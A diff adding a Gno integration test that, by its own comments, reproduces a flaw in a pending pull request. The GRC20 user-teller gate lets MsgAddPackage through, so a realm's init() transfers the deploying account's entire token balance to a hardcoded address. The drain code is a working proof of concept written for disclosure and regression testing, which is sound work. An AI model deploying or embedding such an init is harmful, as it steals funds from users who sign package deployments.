@@ -1,0 +1,94 @@
+# The user-teller gate accepts MsgCall and refuses MsgRun, and MsgAddPackage
+# walks straight through it: a newly deployed realm's init(cur realm) sees an
+# empty-pkgPath previous frame, so IsUserCall() is true and the deployer is the
+# actor. The deployed source is as opaque to a signing wallet as the MsgRun
+# script the design rejects.
+# Measured at 16f54a89c: alice deploys gno.land/r/alice/initdrain and her
+# 1000000 VTOK is gone in the same transaction. At the merge base d43dc0c50 the
+# same init reaches only the new realm's own balance and reports
+# "refused: insufficient balance".
+#
+# Run: from a local clone of gnolang/gno:
+# gh pr checkout 6123 -R gnolang/gno
+# cp grc20_userteller_addpkg_init.txtar gno.land/pkg/integration/testdata/
+# go test -v -run 'TestTestdata/grc20_userteller_addpkg_init' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_userteller_addpkg_init.txtar
+
+loadpkg gno.land/p/demo/tokens/grc20
+loadpkg gno.land/r/test/vtok $WORK/vtok
+
+adduser alice
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+gnokey maketx call -pkgpath gno.land/r/test/vtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
+stdout '1000000 int64'
+
+# One MsgAddPackage. The signing view carries a package path and a source
+# directory, no token, no amount and no recipient.
+gnokey maketx addpkg -pkgdir $WORK/initdrain -pkgpath gno.land/r/alice/initdrain -gas-fee 1000000ugnot -gas-wanted 20000000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/alice/initdrain.Report()"
+stdout 'moved'                      # IS:     the gate that names MsgCall admits MsgAddPackage
+# stdout 'refused: user teller requires a direct EOA call (MsgCall)'  # SHOULD: only the message type the gate names passes
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'
+# stdout '1000000 int64'             # SHOULD: deploying a package moves none of the deployer's tokens
+
+-- vtok/gnomod.toml --
+module = "gno.land/r/test/vtok"
+gno = "0.9"
+
+-- vtok/vtok.gno --
+package vtok
+
+import "gno.land/p/demo/tokens/grc20"
+
+var (
+	Token *grc20.Token
+	adm   *grc20.PrivateLedger
+)
+
+func init(cur realm) {
+	Token, adm = grc20.NewToken("Victim", "VTOK", 4, 0, cur)
+}
+
+func Faucet(cur realm) {
+	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
+		panic(err)
+	}
+}
+
+func BalanceOf(owner address) int64 { return Token.BalanceOf(owner) }
+
+-- initdrain/gnomod.toml --
+module = "gno.land/r/alice/initdrain"
+gno = "0.9"
+
+-- initdrain/initdrain.gno --
+package initdrain
+
+import "gno.land/r/test/vtok"
+
+var Result string
+
+// init runs while the deploying account is still the previous frame, so
+// UserTeller resolves the deployer as the actor.
+func init(cur realm) {
+	victim := cur.Previous().Address()
+	amount := vtok.Token.BalanceOf(victim)
+	err := vtok.Token.UserTeller().Transfer(0, cur, address("g14we3n6qtzjz6z9u2l070zmr4av080t940kamgl"), amount)
+	if err != nil {
+		Result = "refused: " + err.Error()
+		return
+	}
+	Result = "moved"
+}
+
+func Report() string { return Result }
